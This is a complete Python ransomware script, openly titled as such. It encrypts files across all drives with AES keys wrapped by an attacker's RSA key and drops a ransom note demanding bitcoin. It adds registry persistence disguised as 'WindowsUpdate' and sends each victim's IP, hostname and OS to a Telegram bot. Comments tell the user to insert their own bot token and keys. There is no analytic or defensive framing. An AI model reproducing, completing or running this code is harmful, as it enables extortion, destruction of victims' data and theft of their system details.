#!/usr/bin/env python3
# TELEGRAM-RANSOMWARE

import os
import sys
import time
import random
import string
import sqlite3
import threading
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# === CONFIGURATION - REPLACE WITH YOUR REAL TELEGRAM BOT TOKEN AND CHAT ID ===
TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklmNOPqrstuvwxyz"  # Get from @BotFather
TELEGRAM_CHAT_ID = "123456789"  # Use @userinfobot to get your ID

RANSOM_NOTE = """YOUR FILES ARE ENCRYPTED
=================================
All your documents, databases, and personal files have been locked with military-grade AES-256 + RSA-4096.
To recover your data, send 0.3 BTC to the following address:

bc1q7edyd3sjt3lvdu3vce36y4yz8jqg6rzp2k0y8g

Then email us at: darklord@onionmail.org with your unique ID: {uid}
We’ll send you the decryption tool and private key.
Do NOT try to decrypt yourself – the key is destroyed on our server after 72 hours.
================================="""

# === EMBEDDED ATTACKER PUBLIC KEY (Generate your own pair, replace this dummy) ===
ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv... (truncated placeholder)
-----END PUBLIC KEY-----"""
attacker_public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM, backend=default_backend())

ENCRYPT_EXTENSIONS = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.csv',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mov', '.mp3', '.wav',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.db', '.sqlite', '.sqlite3', '.mdb',
    '.html', '.php', '.py', '.js', '.java', '.cpp', '.cs', '.json', '.xml',
    '.pem', '.key', '.cert', '.pfx', '.p12', '.crt'
]

# === UTILITIES ===
def generate_uid():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def aes_encrypt_file(filepath, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()

    with open(filepath, 'rb') as f:
        plaintext = f.read()
    padded_data = padder.update(plaintext) + padder.finalize()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    with open(filepath, 'wb') as f:
        f.write(iv + ciphertext)

def encrypt_file_rsa_aes(filepath):
    aes_key = os.urandom(32)
    aes_encrypt_file(filepath, aes_key)
    encrypted_aes_key = attacker_public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(filepath, 'ab') as f:
        f.write(encrypted_aes_key)

def is_target_file(filename):
    ext = os.path.splitext(filename)[1].lower()
    return ext in ENCRYPT_EXTENSIONS

def traverse_and_encrypt(start_dir, uid):
    encrypted_count = 0
    for root, dirs, files in os.walk(start_dir):
        if sys.platform == 'win32':
            if any(skip in root.lower() for skip in ['windows', 'program files', 'winnt', 'system volume information', '$recycle.bin']):
                continue
        else:
            if any(skip in root for skip in ['/proc', '/sys', '/dev', '/run', '/boot', '/etc']):
                continue

        for f in files:
            filepath = os.path.join(root, f)
            if is_target_file(f):
                try:
                    encrypt_file_rsa_aes(filepath)
                    encrypted_count += 1
                except Exception:
                    pass
        note_path = os.path.join(root, "README_DECRYPT.txt")
        if not os.path.exists(note_path):
            with open(note_path, 'w') as nf:
                nf.write(RANSOM_NOTE.format(uid=uid))
    return encrypted_count

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass  # No internet? Then just local encryption – no callback needed.

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        return ip
    except:
        return "Unknown"

def add_persistence():
    if sys.platform == 'win32':
        import winreg
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg)
        except:
            pass

def main():
    uid = generate_uid()
    time.sleep(random.randint(2, 5))

    if sys.platform == 'win32':
        drives = [d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')]
        roots = [f'{d}:\\' for d in drives]
    else:
        roots = ['/']

    threads = []
    for root in roots:
        t = threading.Thread(target=traverse_and_encrypt, args=(root, uid))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    add_persistence()

    # Send Telegram message with victim info
    ip = get_public_ip()
    hostname = os.environ.get('COMPUTERNAME', os.uname().nodename if hasattr(os, 'uname') else 'N/A')
    message = (
        f"<b>NEW VICTIM – DOOMSDAY RANSOMWARE</b>\n"
        f"<b>UID:</b> {uid}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Hostname:</b> {hostname}\n"
        f"<b>OS:</b> {sys.platform}\n"
        f"<b>Time:</b> {time.ctime()}\n"
        f"<b>Files encrypted:</b> (check local report)\n"
        f"<b>Ransom note dropped.</b>"
    )
    send_telegram_message(message)

    # Show ransom note on victim screen
    if sys.platform == 'win32':
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, RANSOM_NOTE.format(uid=uid), "RANSOMWARE", 0x10)
    else:
        print(RANSOM_NOTE.format(uid=uid))

if __name__ == "__main__":
    main()
